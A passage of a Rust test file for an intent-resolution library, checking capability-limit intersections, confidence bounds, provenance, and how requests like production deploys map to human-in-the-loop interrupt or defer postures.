            assert!(met.is_at_most(&engagements[j].limits));
            assert!(met.is_at_most(&baseline));
            tested += 1;
        }
    }
    assert!(
        tested >= 10_000,
        "should have tested ~10k pairs, got {}",
        tested
    );
}

#[test]
fn thousands_of_capability_slice_intersections() {
    let domains_list: &[&[&str]] = &[
        &["filesystem", "memory"],
        &["filesystem", "memory", "live-data", "web"],
        &["filesystem", "memory", "code-exec", "vcs"],
        &["filesystem", "memory", "documents", "web", "live-data"],
        &["filesystem", "memory", "messaging", "orchestration"],
        &["filesystem", "memory", "orchestration", "documents"],
        &["filesystem", "memory", "code-exec", "vcs", "live-data"],
        &["filesystem", "memory", "observability", "code-exec"],
    ];
    let baseline = Limits::unrestricted();
    let mut tested = 0u64;
    for i in 0..domains_list.len() {
        for j in 0..domains_list.len() {
            let mut a = Limits::unrestricted();
            a.required_domains = DomainSet::only(domains_list[i].iter().copied());
            let mut b = Limits::unrestricted();
            b.required_domains = DomainSet::only(domains_list[j].iter().copied());
            let met = a.meet(&b);
            assert!(met.is_at_most(&a), "meet not below lhs: {} & {}", i, j);
            assert!(met.is_at_most(&b), "meet not below rhs: {} & {}", i, j);
            assert!(
                met.is_at_most(&baseline),
                "meet not below baseline: {} & {}",
                i,
                j
            );
            tested += 1;
        }
    }
    assert!(
        tested >= 64,
        "should have tested {} domain combinations",
        tested
    );
}

// ================================================================
// Part 23: Confidence and threshold edge cases
// ================================================================

#[test]
fn confidence_is_always_in_unit_interval() {
    let cases: &[&str] = &[
        "hi",
        "deploy to production",
        "fix the bug",
        "what is 2+2",
        "write a report and send it to the team and verify the result",
        "analyze the data and compare it with historical trends then report findings with citations",
        "",
        "a",
        "ab",
        "a b c d e f g h i j k l m n o p q r s t u v w x y z",
        "deploy deploy deploy",
        "fix fix fix",
        "test test test",
        "I need to deploy the service to production and I must verify the tests pass green with citations from the audited sources",
    ];
    for text in cases {
        let intent = resolve_text(text);
        let c = intent.reading.confidence;
        assert!(
            (0.0..=1.0).contains(&c),
            "confidence {} out of [0,1] for `{}`",
            c,
            text
        );
    }
}

#[test]
fn confidence_reflects_margin_on_categorical_axes() {
    let extraction = extract(&req("review the code"));
    let (winner, conf) = extraction.act.winner().unwrap();
    assert_eq!(winner, Act::Analyze);
    assert!(
        conf > 0.5,
        "single strong act should have decent confidence"
    );

    let extraction = extract(&req("fix and verify"));
    if extraction.act.winner().is_some() {
        let (_, conf) = extraction.act.winner().unwrap();
        let ranked = extraction.act.ranked();
        if ranked.len() >= 2 {
            assert!(conf <= 0.95, "ambiguous act should not be 100% confident");
        }
    }
}

#[test]
fn evidence_absence_is_confident() {
    // In extraction, absence of evidence words → no votes → winner() is None.
    let extraction = extract(&req("fix the bug"));
    assert!(extraction.evidence.winner().is_none());
    // But in the full resolve, silence reads as a confident Evidence::None
    // (confidence 0.85, above the 0.75 accept floor so the reading resolves).
    let intent = resolve_text("fix the bug");
    assert_eq!(intent.reading.evidence, Evidence::None);
}

#[test]
fn resolution_does_not_panic_on_random_noise() {
    let cases: &[&str] = &[
        "asdf",
        "qwerty",
        "asdfasdfasdf",
        "zxcvbnm",
        "1234567890",
        "!!!",
        "???",
        "---",
        "+++",
        "...",
        "a b c d e f g h i j k l m n o p q r s t u v w x y z",
        "the the the the",
        "a a a a a a a a",
        "to be or not to be that is the question",
        "lorem ipsum dolor sit amet consectetur adipiscing elit",
        "the quick brown fox jumps over the lazy dog",
    ];
    for text in cases {
        let intent = resolve_text(text);
        assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
        assert!((0.0..=1.0).contains(&intent.reading.confidence));
    }
}

// ================================================================
// Part 24: Provenance and signal traceability
// ================================================================

#[test]
fn provenance_records_signals_for_signal_tier() {
    let intent = resolve_text("deploy to production");
    if intent.provenance.tier == Tier::Signals {
        assert!(!intent.provenance.signals.is_empty());
    }
}

#[test]
fn provenance_escalation_note_present_when_below_threshold() {
    let resolution = resolve(
        &req("zorble frobnicate"),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    );
    let intent = resolution.intent();
    assert!(intent.provenance.escalation_note.is_some());
}

#[test]
fn signal_names_are_stable_identifiers() {
    let extraction = extract(&req("deploy the service to production"));
    for signal in &extraction.signals {
        assert!(!signal.name.is_empty(), "signal name must not be empty");
    }
}

#[test]
fn signal_weights_are_non_negative() {
    let extraction = extract(&req("deploy to production and verify with tests"));
    for signal in &extraction.signals {
        assert!(
            signal.weight >= 0.0,
            "signal weight must be non-negative: {:?}",
            signal
        );
    }
}

// ================================================================
// Part 25: Full pipeline — natural language to engagement
// ================================================================

#[test]
fn pipeline_greeting_read_only() {
    let intent = resolve_text("hello there");
    assert_eq!(intent.reading.act, Act::Converse);
    assert_eq!(intent.reading.horizon, Horizon::Immediate);
    assert_eq!(intent.reading.stakes, Stakes::Inert);
    assert_eq!(intent.reading.attendance, Attendance::Interactive);
    assert!(intent.engagement.limits.is_at_most(&Limits::unrestricted()));
    assert_eq!(intent.engagement.posture.context, ContextProfile::Minimal);
}

#[test]
fn pipeline_irreversible_reaches_human() {
    let intent = resolve_text("deploy the service to production");
    assert_eq!(intent.reading.stakes, Stakes::Irreversible);
    assert_eq!(intent.reading.act, Act::Operate);
    assert_eq!(intent.engagement.posture.hil, HilMode::Interrupt);
    assert!(
        intent
            .engagement
            .posture
            .note
            .as_deref()
            .is_some_and(|n| n.contains("cannot be undone"))
    );
}

#[test]
fn pipeline_verification_requires_observed_satisfaction() {
    let intent = resolve_text("make sure the tests pass before merging");
    assert_eq!(intent.reading.evidence, Evidence::Verified);
    assert_eq!(
        intent.engagement.limits.min_satisfaction,
        Satisfaction::Observed
    );
}

#[test]
fn pipeline_audited_work_requires_attested() {
    let intent = resolve_text("review the code and get sign off from compliance");
    assert_eq!(intent.reading.evidence, Evidence::Audited);
    assert_eq!(
        intent.engagement.limits.min_satisfaction,
        Satisfaction::Attested
    );
}

#[test]
fn pipeline_cited_work_adds_live_data_domain() {
    let intent = resolve_text("research the history with cited sources");
    assert_eq!(intent.reading.evidence, Evidence::Cited);
    assert!(
        intent
            .engagement
            .limits
            .required_domains
            .contains("live-data")
    );
    assert_eq!(
        intent.engagement.limits.min_satisfaction,
        Satisfaction::Cited
    );
}

#[test]
fn pipeline_long_horizon_opens_commitment() {
    let intent = resolve_text("check the cloud bill every day and alert me");
    assert_eq!(intent.reading.horizon, Horizon::Durable);
    assert!(intent.engagement.posture.open_commitment);
    assert!(intent.engagement.posture.managed);
    assert_eq!(intent.engagement.posture.context, ContextProfile::Full);
}

#[test]
fn pipeline_surface_changes_attendance() {
    let mut request = req("do something");
    request.surface = Surface::Cron;
    let resolution = resolve(
        &request,
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    );
    let intent = resolution.intent();
    assert_eq!(intent.reading.attendance, Attendance::Unattended);
}

#[test]
fn pipeline_attachment_adds_modality_and_act_signal() {
    let attachments = vec![Attachment {
        modality: Modality::Image,
        name: "diagram.png".into(),
    }];
    let mut request = req("what is wrong with this");
    request.attachments = &attachments;
    let extraction = extract(&request);
    assert!(extraction.input_modalities.contains(&Modality::Image));
    assert!(
        extraction
            .act
            .ranked()
            .iter()
            .any(|(a, _)| *a == Act::Analyze)
    );
}

#[test]
fn pipeline_workspace_repo_adds_domain() {
    let intent = resolve(
        &req_full("refactor the parser", Surface::Cli, true, false, None, 0),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    )
    .intent();
    assert!(intent.reading.domains.contains("engineering"));
}

#[test]
fn pipeline_worker_surface_inherits_unattended() {
    let mut request = req("check the status");
    request.surface = Surface::Worker;
    let extraction = extract(&request);
    assert_eq!(extraction.attendance, Attendance::Unattended);
}

// ================================================================
// Part 26: Authority × Stakes × Autonomy interaction matrix
// ================================================================

#[test]
fn authority_stakes_autonomy_hil_matrix() {
    let mut checked = 0u64;
    for &stakes in &Stakes::ALL {
        for &autonomy in &Autonomy::ALL {
            for &attendance in &Attendance::ALL {
                for &horizon in &[Horizon::Turn, Horizon::Durable] {
                    let r = reading_simple(Act::Modify, horizon, stakes, Evidence::None);
                    let auth = authority_of(autonomy, attendance);
                    let engagement = derive(&r, &auth, true);

                    if stakes == Stakes::Irreversible {
                        // Someone present: interrupt. Nobody present and the
                        // work durable enough to park the question: defer to
                        // the inbox rather than raise a gate that can only
                        // time out.
                        let expected = if !attendance.can_answer_now() && horizon.opens_commitment()
                        {
                            HilMode::Defer
                        } else {
                            HilMode::Interrupt
                        };
                        assert_eq!(
                            engagement.posture.hil, expected,
                            "stakes={stakes:?} autonomy={autonomy:?} attendance={attendance:?} horizon={horizon:?}"
                        );
                    }

                    if !attendance.can_answer_now()
                        && horizon.opens_commitment()
                        && stakes.rank() >= Stakes::Costly.rank()
                    {
                        assert_eq!(engagement.posture.hil, HilMode::Defer);
                    }

                    if attendance == Attendance::Interactive
                        && autonomy == Autonomy::Autonomous
                        && stakes.rank() <= Stakes::Reversible.rank()
                    {
                        assert_eq!(engagement.posture.hil, HilMode::Review);
                    }
                    checked += 1;
                }
            }
        }
    }
    assert!(checked >= 4 * 4 * 3 * 2, "checked {checked} combinations");
}

#[test]
fn regression_polite_preamble_preserves_imperative_verb() {
    let intent_polite = resolve_text("please refactor the parser");
    let intent_direct = resolve_text("refactor the parser");
    assert_eq!(intent_polite.reading.act, Act::Modify);
    assert_eq!(intent_direct.reading.act, Act::Modify);
    assert!(intent_polite.reading.axis_confidence.act >= 0.7);
}

#[test]
fn regression_inflected_evidence_words_match() {
    let intent = resolve_text("please fix the bug, ensuring all tests pass");
    assert_eq!(intent.reading.evidence, Evidence::Verified);
    assert_eq!(
        intent.engagement.limits.min_satisfaction,
        Satisfaction::Observed
    );
}

#[test]
fn regression_disjoint_domain_meet_collapses_to_empty() {
    let a = Limits {
        required_domains: DomainSet::only(["vcs"]),
        ..Limits::unrestricted()
    };
    let b = Limits {
        required_domains: DomainSet::only(["live-data"]),
        ..Limits::unrestricted()
    };
    let met = a.meet(&b);
    assert_eq!(met.required_domains, DomainSet::Empty);
    assert!(met.is_at_most(&a));
    assert!(met.is_at_most(&b));
    assert!(met.is_at_most(&Limits::unrestricted()));
}

#[test]
fn regression_compound_clause_heads_receive_imperative_bonus() {
    let extraction = extract(&req(
        "search for the bug and refactor the parser then verify the tests",
    ));
    let contenders = extraction.act.contenders(0.5);
    assert!(
        contenders.contains(&Act::Locate),
        "Locate must be in contenders"
    );
    assert!(
        contenders.contains(&Act::Modify),
        "Modify must be in contenders"
    );
    assert!(
        contenders.contains(&Act::Verify),
        "Verify must be in contenders"
    );

    // Test with commas and newlines
    let comma_extraction = extract(&req("locate the issue, patch the code, test everything"));
    let comma_contenders = comma_extraction.act.contenders(0.5);
    assert!(comma_contenders.contains(&Act::Locate));
    assert!(comma_contenders.contains(&Act::Modify));
    assert!(comma_contenders.contains(&Act::Verify));
}

#[test]
fn regression_contenders_absolute_floor_and_strong_bypass() {
    let mut votes: vak_intent::signals::Votes<Act> = vak_intent::signals::Votes::default();
    votes.add(Act::Modify, 0.4);
    votes.add(Act::Answer, 0.2); // 0.2 >= 0.4 * 0.5, but < 0.5 absolute floor!
    let contenders = votes.contenders(0.5);
    assert_eq!(
        contenders,
        vec![Act::Modify],
        "0.2 noise must not join contenders below absolute floor"
    );

    // Test strong signal bypass (>= 1.0) when winner is inflated
    let mut inflated: vak_intent::signals::Votes<Act> = vak_intent::signals::Votes::default();
    inflated.add(Act::Modify, 3.5);
    inflated.add(Act::Verify, 1.2); // 1.2 < 3.5 * 0.5 = 1.75, but 1.2 >= 1.0 strong signal!
    let inflated_contenders = inflated.contenders(0.5);
    assert!(inflated_contenders.contains(&Act::Modify));
    assert!(
        inflated_contenders.contains(&Act::Verify),
        "Strong act (>= 1.0) must bypass inflated winner gap"
    );
}
